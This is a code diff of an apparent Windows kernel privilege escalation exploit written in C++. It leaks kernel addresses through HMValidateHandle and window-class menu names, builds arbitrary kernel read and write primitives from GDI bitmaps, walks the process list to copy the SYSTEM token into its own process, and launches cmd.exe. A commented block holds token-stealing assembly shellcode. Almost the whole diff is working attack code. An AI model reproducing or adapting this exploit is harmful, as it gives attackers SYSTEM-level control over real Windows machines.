@@ -23,10 +23,14 @@
  ---->
 */
 
+
+
 #pragma once
+#include "stdafx.h"
 #include <Windows.h>
 #include <stdio.h>
 #include <cstdint>
+#include <conio.h>
 
 #pragma comment(lib, "Gdi32.lib")
 
@@ -63,13 +67,11 @@ GetHMValidateHandle(
 {
 	HMODULE hUser32 = LoadLibraryA("user32.dll");
 	if (hUser32 == NULL) {
-		printf("error: %d\n", GetLastError());
 		exit(GetLastError());
 	}
 
 	BYTE* pIsMenu = (BYTE *)GetProcAddress(hUser32, "IsMenu");
 	if (pIsMenu == NULL) {
-		printf("error: %d\n", GetLastError());
 		exit(GetLastError());
 	}
 	unsigned int uiHMValidateHandleOffset = 0;
@@ -81,7 +83,6 @@ GetHMValidateHandle(
 		}
 	}
 	if (uiHMValidateHandleOffset == 0) {
-		printf("error: %d\n", GetLastError());
 		exit(GetLastError());
 	}
 
@@ -107,6 +108,7 @@ GetNtos(
 		SystemRegistryQuotaInformation = 37,
 		SystemLookasideInformation = 45
 	} SYSTEM_INFORMATION_CLASS;
+
 	typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
 		HANDLE Section;
 		PVOID MappedBase;
@@ -119,16 +121,19 @@ GetNtos(
 		USHORT OffsetToFileName;
 		UCHAR FullPathName[256];
 	} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;
+
 	typedef struct _SYSTEM_MODULE_INFORMATION {
 		ULONG NumberOfModules;
 		SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
 	} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
+
 	typedef NTSTATUS(__stdcall *pfZwQuerySystemInformation)(
 		SYSTEM_INFORMATION_CLASS SystemInformationClass,
 		PVOID SystemInformation,
 		ULONG SystemInformationLength,
 		PULONG ReturnLength
 	);
+
 	DWORD len;
 	PSYSTEM_MODULE_INFORMATION ModuleInfo;
 	PVOID Nt = NULL;
@@ -198,8 +203,8 @@ LeaklpszMenuName(
 	DWORD64 pCLSOffset = 0xa8;
 	DWORD64 lpszMenuNameOffset = 0x90;
 	BOOL bRet = GetHMValidateHandle();
-	uintptr_t lpUserDesktopHeapWindow = (uintptr_t)pHmValidateHandle(hWnd, 1);
-	uintptr_t ulClientDelta = *reinterpret_cast<DWORD64 *>((DWORD64)(lpUserDesktopHeapWindow) + 0x20) - (DWORD64)(lpUserDesktopHeapWindow);
+	void* lpUserDesktopHeapWindow = pHmValidateHandle(hWnd, 1);
+	uintptr_t ulClientDelta = *reinterpret_cast<DWORD64 *>((DWORD64*)(lpUserDesktopHeapWindow) +0x20) - (DWORD64)(lpUserDesktopHeapWindow);
 	uintptr_t KerneltagCLS = *reinterpret_cast<DWORD64 *>((DWORD64)lpUserDesktopHeapWindow+ pCLSOffset);
 	DWORD64 lpszMenuName = *reinterpret_cast<DWORD64 *>(KerneltagCLS - ulClientDelta + lpszMenuNameOffset);
 	return lpszMenuName;
@@ -214,13 +219,21 @@ Leak(
 	
 	DWORD64 Curr, Prev = NULL;
 
-	for (int i = 0; i <= 20; i++) {
+	for (int i = 0; i <= 200; i++) { // This is unstable, need a fix...
+					// the ulClientDelta is dancing beetwin values
+					// & it makes the exploit unstable it a one out of 15...
 		HWND TestWindowHandle = CreateWindowObject();
 		Curr = LeaklpszMenuName(TestWindowHandle);
 		if (1<=i) {
 			if (Curr == Prev) {
 				DestroyWnd(TestWindowHandle);
-				break;
+				WCHAR* Buff = new WCHAR[0x50 * 2 * 4];
+				RtlSecureZeroMemory(Buff, 0x50 * 2 * 4);
+				RtlFillMemory(Buff, 0x50 * 2 * 4, '\x41');
+				hbmp.hBmp = CreateBitmap(0x701, 2, 1, 8, Buff);
+				hbmp.kAddr = Curr;
+				hbmp.pvScan0 = (PUCHAR)(Curr + 0x50);
+				return TRUE;
 			}
 		}
 		DestroyWnd(TestWindowHandle);
@@ -238,14 +251,13 @@ Leak(
 }
 
 DWORD64
-BitmapRead(
-	HBITMAP &Mgr,
+BitmapArbitraryRead(
+	HBITMAP &Mgr, // Send a Fkin reference!
 	HBITMAP &Wrk,
 	DWORD64 addr
 )
 {
 
-	//printf("reading addr at: %p\n", addr);
 	LPVOID bRet = VirtualAlloc(
 		0, sizeof(addr),
 		MEM_COMMIT | MEM_RESERVE,
@@ -253,36 +265,29 @@ BitmapRead(
 	);
 	auto m = SetBitmapBits(Mgr, sizeof(addr), (LPVOID *)&addr);
 	if (m == 0) {
-		//printf("error setting bits!");
-		exit(GetLastError());
+		printf("error setting bits!");
 	}
 
 	if (GetBitmapBits(Wrk, sizeof(bRet), bRet) == NULL) {
-		//printf("err");
-		exit(GetLastError());
+		printf("err");
 	}
 	auto retV = *((DWORD64 *)bRet);
-	VirtualFree( &bRet, sizeof(bRet), MEM_FREE | MEM_RELEASE );
-	printf("%p\n", retV);
+	VirtualFree( bRet, sizeof(bRet), MEM_FREE | MEM_RELEASE );
 	return retV;
 }
 
-DWORD64 
-BitmapWrite(
+DWORD64 BitmapArbitraryWrite(
 	HBITMAP &Mgr,
 	HBITMAP &Wrk,
 	DWORD64 addr,
 	DWORD64 Val
 	) 
 {
-	
-	if (SetBitmapBits(Mgr, sizeof(addr), (LPVOID *)(&addr)) == 0) {
-		printf("error setting bits");
-		exit(GetLastError());
-	}
-	if (SetBitmapBits(Wrk, sizeof(Val), (LPVOID *)(&Val)) == 0) {
-		printf("error setting bits");
-		exit(GetLastError());
+
+	SetBitmapBits(Mgr, 8, (LPVOID *)&addr);
+
+	if (SetBitmapBits(Wrk, 8, &Val) == 0) {
+		return -1;
 	}
 	return(0);
 }
@@ -291,6 +296,7 @@ int
 main(
 )
 {
+
 	printf("\n[!] gdi feng shui ..\n");
 	printf("[>] Spraying the pool\n");
 	printf("[>] leaking ulClientDelta...\n");
@@ -309,12 +315,14 @@ main(
 	printf("[+] Mgr pvScan0 offset: %p\n", managerBitmap.kAddr & -0xfff);
 	printf("[+] Wrk pvScan0 offset: %p\n", workerBitmap.kAddr & -0xfff);
 
+	//getch();
+
 	byte Buff[sizeof(LPVOID) * 2] = { 0 };
 
 	LPVOID wPtr = VirtualAlloc(0, sizeof(LPVOID), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	memcpy(wPtr, &workerBitmap.pvScan0, sizeof(LPVOID));
 	memcpy(Buff, &wPtr, sizeof(LPVOID));
-	memcpy(Buff + 8, &managerBitmap.pvScan0, sizeof(LPVOID));
+	memcpy(Buff + sizeof(LPVOID), &managerBitmap.pvScan0, sizeof(LPVOID));
 
 	DWORD u = 0;
 
@@ -354,67 +362,85 @@ main(
 
 	CloseHandle(dev);
 
-	DWORD64 _EP = GetPsInitialSystemProcess();
-	printf("\n[!] running exploit...\n\n\n");	
-
-	DWORD64 SepPtr = BitmapRead(
-		managerBitmap.hBmp,
-		workerBitmap.hBmp,
-		_EP
-	);
-
-	DWORD64 SysTokenPtr = SepPtr + 0x358;
-
-	DWORD64 SysToken = BitmapRead(
-		managerBitmap.hBmp,
-		workerBitmap.hBmp,
-		SysTokenPtr
-	);
-
-	DWORD64 NextPEP = BitmapRead(
-		managerBitmap.hBmp,
-		workerBitmap.hBmp, 
-		SepPtr + 0x2F0
-	) - 0x2E8 - 0x8;
+	DWORD64 EpPtr = GetPsInitialSystemProcess();
+	printf("\n[!] running exploit...\n\n\n");
 
 
-	DWORD64 Token = NULL;
+/*
 
+	This is The ShellCode used to OverWrite The Token...
+	it worked in the asseambly so no reason it wont work here...
 
-	while (1) {
+;; kd> dps gs:188 l1
+;;  nt!KiInitialThread
+mov rax, [gs:0x188]
+mov rax, [rax+0xb8]
+;; kd> dt nt!_EPROCESS poi(nt!KiInitialThread+b8)
+;;   +0x000 Pcb              : _KPROCESS
+;;   [...]
+;;   +0x2e0 UniqueProcessId  : 0x00000000`00000004 Void
+;;   +0x2e8 ActiveProcessLinks : _LIST_ENTRY
+;;   [...]
+;;  +0x358 Token            : _EX_FAST_REF
+;;
+;; place KiInitialThread+b8
+;; in rbx.
+mov rbx, rax
+loop:
+mov rbx, [rbx+0x2e8]    ;; Get the next process
+sub rbx, 0x2e8
+mov rcx, [rbx+0x2e0]	;; place process in rcx
+cmp rcx, 4		;; Compare to System pid.
+jnz loop
+mov rcx, [rbx + 0x358]
+and cl, 0xf0		;; Null the token
+mov [rax + 0x358], rcx
+	
+	
+*/
 
-		DWORD64 NextPID = BitmapRead(
-			managerBitmap.hBmp,
-			workerBitmap.hBmp,
-			NextPEP + 0x2E8
-		);
-
-		if (NextPID == GetCurrentProcessId()) {
-			Token = BitmapRead(
-				managerBitmap.hBmp,
-				workerBitmap.hBmp,
-				NextPEP + 0x358
-			);
-			break;
-
-		}
-
-		NextPEP = BitmapRead(
-			managerBitmap.hBmp,
-			workerBitmap.hBmp,
-			NextPEP + 0x2F0
-		) - 0x2E8 - 0x8;
-
+	DWORD64 SystemEP = BitmapArbitraryRead(
+		managerBitmap.hBmp, workerBitmap.hBmp, EpPtr);
+	if (SystemEP == -1) {
+		return -1;
 	}
 
 
-	BitmapWrite(
-		managerBitmap.hBmp,
-		workerBitmap.hBmp,
-		NextPEP + 0x358,
-		SysToken
-	);
+	DWORD64 TokenPtr = SystemEP + 0x358; 
+	DWORD64 SysToken = BitmapArbitraryRead(
+		managerBitmap.hBmp, workerBitmap.hBmp, TokenPtr);
+	if (SysToken == -1) {
+	}
+	printf("System TOKEN: %p\n", SysToken);
+
+	DWORD PID = GetCurrentProcessId(); 
+	DWORD64 NextEpPtr = BitmapArbitraryRead(
+		managerBitmap.hBmp, workerBitmap.hBmp, (
+		((DWORD64)SystemEP) + ((DWORD64)0x2e8))) - 0x2e8;
+
+
+	DWORD64 CurrentToken = 0;
+
+
+	while (TRUE) {
+
+		DWORD64 NextProcessPID = BitmapArbitraryRead(
+			managerBitmap.hBmp, workerBitmap.hBmp, ((DWORD64)NextEpPtr + 0x2E0));
+		if (NextProcessPID == PID) { 
+			CurrentToken = BitmapArbitraryRead(
+				managerBitmap.hBmp, workerBitmap.hBmp, ((DWORD64)NextEpPtr + 0x358));
+			printf("Our TOKEN: %p\n\n\n", CurrentToken);
+			break;
+		}
+		NextEpPtr = BitmapArbitraryRead(
+			managerBitmap.hBmp, workerBitmap.hBmp, (
+			(DWORD64)NextEpPtr + 0x2e8)) - 0x2e8;
+	}
+
+	BitmapArbitraryWrite(managerBitmap.hBmp, workerBitmap.hBmp, (
+		(DWORD64)NextEpPtr + 0x358), ((DWORD64)SysToken & -0xf)); // Null The Damn Ref_count...
 
 	system("cmd.exe");
 	return 0;
 }
+
